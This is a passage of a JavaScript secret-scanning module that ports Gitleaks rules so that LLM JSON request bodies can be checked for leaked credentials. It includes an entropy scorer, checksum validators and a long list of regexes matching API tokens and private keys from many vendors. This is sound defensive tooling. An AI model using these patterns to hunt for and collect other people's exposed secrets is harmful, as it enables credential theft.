,"8":11.1954,"9":11.1954,"$":2.5336},"s":{"a":4.9746,"b":8.0715,"c":5.1329,"d":8.0715,"e":3.3285,"f":8.0715,"g":8.9195,"h":4.2756,"i":3.7738,"j":11.2414,"k":7.5409,"l":4.9746,"m":6.5975,"n":7.1539,"o":4.2302,"p":5.1329,"q":8.0715,"r":8.0715,"s":4.7022,"t":2.5654,"u":5.8838,"v":7.1539,"w":5.6267,"x":8.0715,"y":5.8838,"z":11.2414,"0":11.2414,"1":11.2414,"2":11.2414,"3":11.2414,"4":11.2414,"5":11.2414,"6":11.2414,"7":11.2414,"8":11.2414,"9":11.2414,"$":1.8299},"t":{"a":3.2534,"b":7.5809,"c":6.6375,"d":8.9594,"e":2.8343,"f":8.9594,"g":8.9594,"h":3.1676,"i":3.4676,"j":8.9594,"k":8.9594,"l":5.0915,"m":8.9594,"n":8.1114,"o":3.7815,"p":6.889,"q":8.9594,"r":4.4612,"s":4.5671,"t":4.6231,"u":5.6666,"v":11.2814,"w":6.6375,"x":8.9594,"y":5.4485,"z":7.5809,"0":11.2814,"1":11.2814,"2":11.2814,"3":11.2814,"4":11.2814,"5":11.2814,"6":11.2814,"7":11.2814,"8":11.2814,"9":11.2814,"$":2.2019},"u":{"a":5.2466,"b":5.0602,"c":4.747,"d":4.3767,"e":4.747,"f":6.9347,"g":4.1739,"h":10.1046,"i":4.6127,"j":6.4042,"k":6.4042,"l":3.9961,"m":4.2717,"n":2.7383,"o":10.1046,"p":4.4899,"q":10.1046,"r":3.3364,"s":3.0493,"t":3.9148,"u":10.1046,"v":6.4042,"w":10.1046,"x":7.7827,"y":7.7827,"z":6.4042,"0":10.1046,"1":10.1046,"2":10.1046,"3":10.1046,"4":10.1046,"5":10.1046,"6":10.1046,"7":10.1046,"8":10.1046,"9":10.1046,"$":4.2717},"v":{"a":2.702,"b":8.8106,"c":8.8106,"d":8.8106,"e":1.2181,"f":8.8106,"g":5.6406,"h":8.8106,"i":2.0424,"j":8.8106,"k":8.8106,"l":6.4886,"m":8.8106,"n":8.8106,"o":6.4886,"p":8.8106,"q":8.8106,"r":8.8106,"s":8.8106,"t":6.4886,"u":6.4886,"v":8.8106,"w":8.8106,"x":8.8106,"y":6.4886,"z":8.8106,"0":8.8106,"1":8.8106,"2":8.8106,"3":8.8106,"4":8.8106,"5":8.8106,"6":8.8106,"7":8.8106,"8":8.8106,"9":8.8106,"$":4.7231},"w":{"a":2.7152,"b":9.3151,"c":6.9932,"d":9.3151,"e":2.4448,"f":9.3151,"g":9.3151,"h":2.6009,"i":2.776,"j":9.3151,"k":9.3151,"l":6.9932,"m":9.3151,"n":4.4572,"o":3.9576,"p":9.3151,"q":9.3151,"r":4.6713,"s":5.2277,"t":6.1452,"u":6.9932,"v":9.3151,"w":9.3151,"x":9.3151,"y":9.3151,"z":9.3151,"0":9.3151,"1":9.3151,"2":9.3151,"3":9.3151,"4":9.3151,"5":9.3151,"6":9.3151,"7":9.3151,"8":9.3151,"9":9.3151,"$":3.2928},"x":{"a":4.618,"b":7.7879,"c":4.618,"d":5.466,"e":4.0875,"f":5.466,"g":7.7879,"h":7.7879,"i":3.7004,"j":7.7879,"k":7.7879,"l":4.0875,"m":3.7004,"n":7.7879,"o":7.7879,"p":4.618,"q":7.7879,"r":5.466,"s":7.7879,"t":3.3956,"u":7.7879,"v":7.7879,"w":5.466,"x":7.7879,"y":4.618,"z":7.7879,"0":7.7879,"1":7.7879,"2":7.7879,"3":7.7879,"4":7.7879,"5":7.7879,"6":7.7879,"7":7.7879,"8":7.7879,"9":7.7879,"$":1.8572},"y":{"a":4.5801,"b":7.4676,"c":5.3972,"d":6.0891,"e":4.7451,"f":7.4676,"g":6.0891,"h":6.0891,"i":6.0891,"j":7.4676,"k":6.6196,"l":5.3972,"m":5.3972,"n":6.0891,"o":4.432,"p":3.3801,"q":9.7895,"r":5.7021,"s":4.2977,"t":3.8588,"u":9.7895,"v":9.7895,"w":5.7021,"x":6.6196,"y":6.6196,"z":5.7021,"0":9.7895,"1":9.7895,"2":9.7895,"3":9.7895,"4":9.7895,"5":9.7895,"6":9.7895,"7":9.7895,"8":9.7895,"9":9.7895,"$":1.3425},"z":{"a":3.4748,"b":5.2403,"c":7.5622,"d":5.2403,"e":2.3528,"f":7.5622,"g":7.5622,"h":7.5622,"i":3.1699,"j":7.5622,"k":7.5622,"l":7.5622,"m":4.3923,"n":7.5622,"o":5.2403,"p":7.5622,"q":7.5622,"r":7.5622,"s":4.3923,"t":7.5622,"u":5.2403,"v":7.5622,"w":7.5622,"x":7.5622,"y":3.8618,"z":4.3923,"0":7.5622,"1":7.5622,"2":7.5622,"3":7.5622,"4":7.5622,"5":7.5622,"6":7.5622,"7":7.5622,"8":7.5622,"9":7.5622,"$":2.7043},"0":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095},"1":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095},"2":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095},"3":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095},"4":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095},"5":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095},"6":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095},"7":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095},"8":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095},"9":{"a":5.2095,"b":5.2095,"c":5.2095,"d":5.2095,"e":5.2095,"f":5.2095,"g":5.2095,"h":5.2095,"i":5.2095,"j":5.2095,"k":5.2095,"l":5.2095,"m":5.2095,"n":5.2095,"o":5.2095,"p":5.2095,"q":5.2095,"r":5.2095,"s":5.2095,"t":5.2095,"u":5.2095,"v":5.2095,"w":5.2095,"x":5.2095,"y":5.2095,"z":5.2095,"0":5.2095,"1":5.2095,"2":5.2095,"3":5.2095,"4":5.2095,"5":5.2095,"6":5.2095,"7":5.2095,"8":5.2095,"9":5.2095,"$":5.2095}};

export function entropyThreshold(length) {
  if (length <= 8) return Infinity;
  if (length >= ENTROPY_THRESHOLDS[ENTROPY_THRESHOLDS.length - 1][0]) return ENTROPY_THRESHOLDS[ENTROPY_THRESHOLDS.length - 1][1];
  for (let i = 0; i < ENTROPY_THRESHOLDS.length - 1; i++) {
    const [l1, h1] = ENTROPY_THRESHOLDS[i];
    const [l2, h2] = ENTROPY_THRESHOLDS[i + 1];
    if (length >= l1 && length <= l2) {
      const t = (length - l1) / (l2 - l1);
      return h1 + (h2 - h1) * t;
    }
  }
  return ENTROPY_THRESHOLDS[0][1];
}

function shannonEntropy(s) {
  const counts = new Map();
  for (const c of s) counts.set(c, (counts.get(c) || 0) + 1);
  let h = 0;
  for (const n of counts.values()) { const p = n / s.length; h -= p * Math.log2(p); }
  return h;
}

export function entropyScore(block) {
  if (block.length <= 8 || !/^[A-Za-z0-9]+$/.test(block) || /^\d+$/.test(block)) return 0;
  const s = block.toLowerCase();
  let prev = "^", bits = 0;
  for (const ch of s) {
    const row = BIGRAM_COST[prev] || BIGRAM_COST["^"];
    bits += row[ch] ?? 12;
    prev = ch;
  }
  bits += (BIGRAM_COST[prev] || BIGRAM_COST["^"])["$"] ?? 12;
  return bits / (s.length + 1);
}

export function isHighEntropyBlock(block) {
  if (block.length <= 8 || /^\d+$/.test(block)) return false;
  // Cross-entropy alone can rate repeated odd strings highly. Require actual symbol diversity too.
  if (shannonEntropy(block.toLowerCase()) < Math.min(2.5, Math.log2(block.length) * 0.72)) return false;
  return entropyScore(block) > entropyThreshold(block.length);
}

function luhnValid(digits) {
  let sum = 0, doubleIt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = digits.charCodeAt(i) - 48;
    if (doubleIt) { n *= 2; if (n > 9) n -= 9; }
    sum += n; doubleIt = !doubleIt;
  }
  return sum % 10 === 0;
}

function chinaIdValid(id) {
  if (!/^\d{17}[0-9Xx]$/.test(id)) return false;
  const weights = [7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2];
  const checks = "10X98765432";
  let sum = 0;
  for (let i = 0; i < 17; i++) sum += Number(id[i]) * weights[i];
  return checks[sum % 11] === id[17].toUpperCase();
}

// Portable execution layer for the current upstream Gitleaks default rule style.
// Upstream uses Go/RE2 + TOML metadata. In a single Web-API-only Worker we execute
// JavaScript-safe equivalents and preserve the important rule semantics: keywords,
// secretGroup extraction, Shannon entropy thresholds, regex allowlists, and stopwords.
// File-path-only rules have no meaningful path in an LLM JSON body and are therefore
// not included. See docs/GITLEAKS-COMPAT.md.
function regexEscape(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function glRule(id, regex, options = {}) {
  return {
    id,
    regex,
    secretGroup: options.secretGroup || 0,
    entropy: options.entropy || 0,
    keywords: (options.keywords || []).map((x) => x.toLowerCase()),
    allowRegexes: options.allowRegexes || [],
    stopwords: (options.stopwords || []).map((x) => x.toLowerCase()),
  };
}

function assignmentRule(id, names, valueSource, options = {}) {
  const keys = Array.isArray(names) ? names : [names];
  const keySource = options.keySource || keys.map(regexEscape).join("|");
  const regex = new RegExp(
    String.raw`[\w.-]{0,50}?(?:${keySource})(?:[ \t\w.-]{0,20})[\s'"]{0,3}(?:=|>|:{1,3}=|\|\||:|=>|\?=|,)[\x60'"\s=]{0,5}(${valueSource})(?:[\x60'"\s;]|\\[nr]|$)`,
    "gi",
  );
  return glRule(id, regex, { ...options, secretGroup: 1, keywords: options.keywords || keys });
}

const GITLEAK_DIRECT_RULES = [
  glRule("1password-secret-key", /\b(A3-[A-Z0-9]{6}-(?:(?:[A-Z0-9]{11})|(?:[A-Z0-9]{6}-[A-Z0-9]{5}))-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5})\b/g, { secretGroup:1, entropy:3.8, keywords:["a3-"] }),
  glRule("1password-service-account-token", /(ops_eyJ[A-Za-z0-9+/]{250,}={0,3})/g, { secretGroup:1, entropy:4, keywords:["ops_"] }),
  glRule("age-secret-key", /(AGE-SECRET-KEY-1[QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7L]{58})/g, { secretGroup:1, keywords:["age-secret-key-1"] }),
  glRule("airtable-personal-access-token", /\b(pat[A-Za-z0-9]{14}\.[a-f0-9]{64})\b/g, { secretGroup:1, keywords:["pat"] }),
  glRule("alibaba-access-key-id", /\b(LTAI[a-z0-9]{20})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:2, keywords:["ltai"] }),
  glRule("anthropic-admin-api-key", /\b(sk-ant-admin01-[A-Za-z0-9_-]{93}AA)(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, keywords:["sk-ant-admin01"] }),
  glRule("anthropic-api-key", /\b(sk-ant-api03-[A-Za-z0-9_-]{93}AA)(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, keywords:["sk-ant-api03"] }),
  glRule("artifactory-api-key", /\b(AKCp[A-Za-z0-9]{69})\b/g, { secretGroup:1, entropy:4.5, keywords:["akcp"] }),
  glRule("artifactory-reference-token", /\b(cmVmd[A-Za-z0-9]{59})\b/g, { secretGroup:1, entropy:4.5, keywords:["cmvmd"] }),
  glRule("aws-access-token", /\b((?:A3T[A-Z0-9]|AKIA|ASIA|ABIA|ACCA)[A-Z2-7]{16})\b/g, { secretGroup:1, entropy:3, keywords:["a3t","akia","asia","abia","acca"], allowRegexes:[/.+EXAMPLE$/] }),
  glRule("aws-bedrock-long-lived", /\b(ABSK[A-Za-z0-9+/]{109,269}={0,2})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3, keywords:["absk"] }),
  glRule("aws-bedrock-short-lived", /(bedrock-api-key-YmVkcm9jay5hbWF6b25hd3MuY29t)/g, { secretGroup:1, entropy:3, keywords:["bedrock-api-key-"] }),
  glRule("azure-ad-client-secret", /(?:^|[\\'"`\s>=:(,)])([A-Za-z0-9_~.]{3}\dQ~[A-Za-z0-9_~.-]{31,34})(?:$|[\\'"`\s<),])/g, { secretGroup:1, entropy:3, keywords:["q~"] }),
  glRule("clickhouse-cloud-api-secret-key", /\b(4b1d[A-Za-z0-9]{38})\b/g, { secretGroup:1, entropy:3, keywords:["4b1d"] }),
  glRule("clojars-api-token", /(CLOJARS_[A-Za-z0-9]{60})/gi, { secretGroup:1, entropy:2, keywords:["clojars_"] }),
  glRule("databricks-api-token", /\b(dapi[a-f0-9]{32}(?:-\d)?)(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["dapi"] }),
  glRule("defined-networking-api-token", /\b(dnkey-[A-Za-z0-9=_-]{26}-[A-Za-z0-9=_-]{52})\b/gi, { secretGroup:1, keywords:["dnkey"] }),
  glRule("digitalocean-access-token", /\b(doo_v1_[a-f0-9]{64})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["doo_v1_"] }),
  glRule("digitalocean-pat", /\b(dop_v1_[a-f0-9]{64})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["dop_v1_"] }),
  glRule("digitalocean-refresh-token", /\b(dor_v1_[a-f0-9]{64})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, keywords:["dor_v1_"] }),
  glRule("doppler-api-token", /(dp\.pt\.[A-Za-z0-9]{43})/gi, { secretGroup:1, entropy:2, keywords:["dp.pt."] }),
  glRule("dropbox-short-lived-api-token", /\b(sl\.[A-Za-z0-9=_-]{135})\b/gi, { secretGroup:1, keywords:["sl."] }),
  glRule("flutterwave-encryption-key", /(FLWSECK_TEST-[A-H0-9]{12})/gi, { secretGroup:1, entropy:2, keywords:["flwseck_test"] }),
  glRule("flutterwave-public-key", /(FLWPUBK_TEST-[A-H0-9]{32}-X)/gi, { secretGroup:1, entropy:2, keywords:["flwpubk_test"] }),
  glRule("flutterwave-secret-key", /(FLWSECK_TEST-[A-H0-9]{32}-X)/gi, { secretGroup:1, entropy:2, keywords:["flwseck_test"] }),
  glRule("flyio-access-token", /\b((?:fo1_[\w-]{43}|fm1[ar]_[A-Za-z0-9+/]{100,}={0,3}|fm2_[A-Za-z0-9+/]{100,}={0,3}))(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:4, keywords:["fo1_","fm1","fm2_"] }),
  glRule("frameio-api-token", /(fio-u-[A-Za-z0-9\-_=]{64})/gi, { secretGroup:1, keywords:["fio-u-"] }),
  glRule("gcp-api-key", /\b(AIza[\w-]{35})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:4, keywords:["aiza"], allowRegexes:[/^AIzaSyabcdefghijklmnopqrstuvwxyz1234567$/] }),
  glRule("github-classic-token", /\b(gh[pousr]_[A-Za-z0-9]{36,255})\b/g, { secretGroup:1, keywords:["ghp_","gho_","ghu_","ghs_","ghr_"] }),
  glRule("github-fine-grained-pat", /\b(github_pat_[A-Za-z0-9_]{70,255})\b/g, { secretGroup:1, keywords:["github_pat_"] }),
  glRule("gitlab-deploy-token", /(gldt-[0-9A-Za-z_-]{20})/g, { secretGroup:1, entropy:3, keywords:["gldt-"] }),
  glRule("gitlab-feature-flag-client-token", /(glffct-[0-9A-Za-z_-]{20})/g, { secretGroup:1, entropy:3, keywords:["glffct-"] }),
  glRule("gitlab-feed-token", /(glft-[0-9A-Za-z_-]{20})/g, { secretGroup:1, entropy:3, keywords:["glft-"] }),
  glRule("gitlab-incoming-mail-token", /(glimt-[0-9A-Za-z_-]{25})/g, { secretGroup:1, entropy:3, keywords:["glimt-"] }),
  glRule("gitlab-kubernetes-agent-token", /(glagent-[0-9A-Za-z_-]{50})/g, { secretGroup:1, entropy:3, keywords:["glagent-"] }),
  glRule("gitlab-oauth-app-secret", /(gloas-[0-9A-Za-z_-]{64})/g, { secretGroup:1, entropy:3, keywords:["gloas-"] }),
  glRule("gitlab-pat", /(glpat-[\w-]{20})/g, { secretGroup:1, entropy:3, keywords:["glpat-"] }),
  glRule("gitlab-pat-routable", /\b(glpat-[0-9A-Za-z_-]{27,300}\.[0-9a-z]{9})\b/g, { secretGroup:1, entropy:4, keywords:["glpat-"] }),
  glRule("gitlab-ptt", /(glptt-[0-9a-f]{40})/g, { secretGroup:1, entropy:3, keywords:["glptt-"] }),
  glRule("gitlab-rrt", /(GR1348941[\w-]{20})/g, { secretGroup:1, entropy:3, keywords:["gr1348941"] }),
  glRule("gitlab-scim-token", /(glsoat-[0-9A-Za-z_-]{20})/g, { secretGroup:1, entropy:3, keywords:["glsoat-"] }),
  glRule("gitlab-session-cookie", /(_gitlab_session=[0-9a-z]{32})/g, { secretGroup:1, entropy:3, keywords:["_gitlab_session="] }),
  glRule("grafana-api-key", /\b(eyJrIjoi[A-Za-z0-9]{70,400}={0,3})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["eyjrijoi"] }),
  glRule("grafana-cloud-api-token", /\b(glc_[A-Za-z0-9+/]{32,400}={0,3})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["glc_"] }),
  glRule("grafana-service-account-token", /\b(glsa_[A-Za-z0-9]{32}_[A-Fa-f0-9]{8})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["glsa_"] }),
  glRule("harness-api-key", /\b((?:pat|sat)\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9]{24}\.[A-Za-z0-9]{20})\b/g, { secretGroup:1, keywords:["pat.","sat."] }),
  glRule("hashicorp-tf-api-token", /\b([a-z0-9]{14}\.atlasv1\.[a-z0-9\-_=]{60,70})\b/gi, { secretGroup:1, entropy:3.5, keywords:["atlasv1"] }),
  glRule("heroku-api-key-v2", /\b(HRKU-AA[0-9A-Za-z_-]{58})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:4, keywords:["hrku-aa"] }),
  glRule("huggingface-access-token", /\b(hf_[a-z]{34})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:2, keywords:["hf_"] }),
  glRule("huggingface-organization-api-token", /\b(api_org_[a-z]{34})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:2, keywords:["api_org_"] }),
  glRule("infracost-api-token", /\b(ico-[A-Za-z0-9]{32})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3, keywords:["ico-"] }),
  glRule("intra42-client-secret", /\b(s-s4t2(?:ud|af)-[a-f0-9]{64})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["s-s4t2ud-","s-s4t2af-"] }),
  glRule("jwt-compact-broad", /\b(eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{16,})\b/g, { secretGroup:1, entropy:3 }),
  glRule("linear-api-key", /(lin_api_[A-Za-z0-9]{40})/gi, { secretGroup:1, entropy:2, keywords:["lin_api_"] }),
  glRule("mailgun-private-api-token", /\b(key-[a-f0-9]{32})\b/gi, { secretGroup:1, keywords:["key-"] }),
  glRule("microsoft-teams-webhook", /(https:\/\/[a-z0-9]+\.webhook\.office\.com\/webhookb2\/[a-z0-9]{8}-(?:[a-z0-9]{4}-){3}[a-z0-9]{12}@[a-z0-9]{8}-(?:[a-z0-9]{4}-){3}[a-z0-9]{12}\/IncomingWebhook\/[a-z0-9]{32}\/[a-z0-9]{8}-(?:[a-z0-9]{4}-){3}[a-z0-9]{12})/gi, { secretGroup:1, keywords:["webhook.office.com","incomingwebhook"] }),
  glRule("new-relic-browser-api-token", /\b(NRJS-[a-f0-9]{19})\b/gi, { secretGroup:1, keywords:["nrjs-"] }),
  glRule("new-relic-user-api-key", /\b(NRAK-[a-z0-9]{27})\b/gi, { secretGroup:1, keywords:["nrak"] }),
  glRule("notion-api-token", /\b(ntn_[0-9]{11}[A-Za-z0-9]{35})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:4, keywords:["ntn_"] }),
  glRule("npm-access-token", /\b(npm_[a-z0-9]{36})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:2, keywords:["npm_"] }),
  glRule("openshift-user-token", /\b(sha256~[\w-]{43})(?:[^\w-]|$)/g, { secretGroup:1, entropy:3.5, keywords:["sha256~"] }),
  glRule("openai-api-key", /\b(sk-(?:proj-)?[A-Za-z0-9_-]{20,200})\b/g, { secretGroup:1, entropy:3, keywords:["sk-"] }),
  glRule("perplexity-api-key", /\b(pplx-[A-Za-z0-9]{48})(?:[\x60'"\s;]|\\[nr]|$|\b)/g, { secretGroup:1, entropy:4, keywords:["pplx-"] }),
  glRule("planetscale-api-token", /\b(pscale_tkn_[\w=.-]{32,64})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["pscale_tkn_"] }),
  glRule("planetscale-oauth-token", /\b(pscale_oauth_[\w=.-]{32,64})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3, keywords:["pscale_oauth_"] }),
  glRule("planetscale-password", /\b(pscale_pw_[\w=.-]{32,64})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["pscale_pw_"] }),
  glRule("postman-api-token", /\b(PMAK-[a-f0-9]{24}-[a-f0-9]{34})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:3, keywords:["pmak-"] }),
  glRule("prefect-api-token", /\b(pnu_[A-Za-z0-9]{36})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:2, keywords:["pnu_"] }),
  glRule("private-key", /(-----BEGIN[ A-Z0-9_-]{0,100}PRIVATE KEY(?: BLOCK)?-----[\s\S-]{64,}?KEY(?: BLOCK)?-----)/gi, { secretGroup:1, keywords:["-----begin"] }),
  glRule("pulumi-api-token", /\b(pul-[a-f0-9]{40})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:2, keywords:["pul-"] }),
  glRule("pypi-upload-token", /(pypi-AgEIcHlwaS5vcmc[\w-]{50,1000})/g, { secretGroup:1, entropy:3, keywords:["pypi-ageichlwas5vcmc"] }),
  glRule("readme-api-token", /\b(rdme_[a-z0-9]{70})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:2, keywords:["rdme_"] }),
  glRule("rubygems-api-token", /\b(rubygems_[a-f0-9]{48})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:2, keywords:["rubygems_"] }),
  glRule("scalingo-api-token", /\b(tk-us-[\w-]{48})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:2, keywords:["tk-us-"] }),
  glRule("sendgrid-api-token", /\b(SG\.[A-Za-z0-9=_\-.]{66})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:2, keywords:["sg."] }),
  glRule("sendinblue-api-token", /\b(xkeysib-[a-f0-9]{64}-[a-z0-9]{16})(?:[\x60'"\s;]|\\[nr]|$)/gi, { secretGroup:1, entropy:2, keywords:["xkeysib-"] }),
  glRule("sentry-org-token", /\b(sntrys_eyJpYXQiO[A-Za-z0-9+/]{10,200}(?:LCJyZWdpb25fdXJs|InJlZ2lvbl91cmwi|cmVnaW9uX3VybCI6)[A-Za-z0-9+/]{10,200}={0,2}_[A-Za-z0-9+/]{43})(?:[^A-Za-z0-9+/]|$)/g, { secretGroup:1, entropy:4.5, keywords:["sntrys_eyjpyxqio"] }),
  glRule("sentry-user-token", /\b(sntryu_[a-f0-9]{64})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3.5, keywords:["sntryu_"] }),
  glRule("settlemint-application-access-token", /\b(sm_aat_[A-Za-z0-9]{16})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3, keywords:["sm_aat"] }),
  glRule("settlemint-personal-access-token", /\b(sm_pat_[A-Za-z0-9]{16})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3, keywords:["sm_pat"] }),
  glRule("settlemint-service-access-token", /\b(sm_sat_[A-Za-z0-9]{16})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:3, keywords:["sm_sat"] }),
  glRule("shippo-api-token", /\b(shippo_(?:live|test)_[A-Fa-f0-9]{40})(?:[\x60'"\s;]|\\[nr]|$)/g, { secretGroup:1, entropy:2, keywords:["shippo_"] }),
  glRule("shopify-access-token", /(shpat_[A-Fa-f0-9]{32})/g, { secretGroup:1, entropy:2, keywords:["shpat_"] }),
  glRule("shopify-custom-access-token", /(shpca_[A-Fa-f0-9]{32})/g, { secretGroup:1, entropy:2, keywords:["shpca_"] }),
  glRule("shopify-private-app-access-token", /(shppa_[A-Fa-f0-9]{32})/g, { secretGroup:1, entropy:2, keywords:["shppa_"] }),
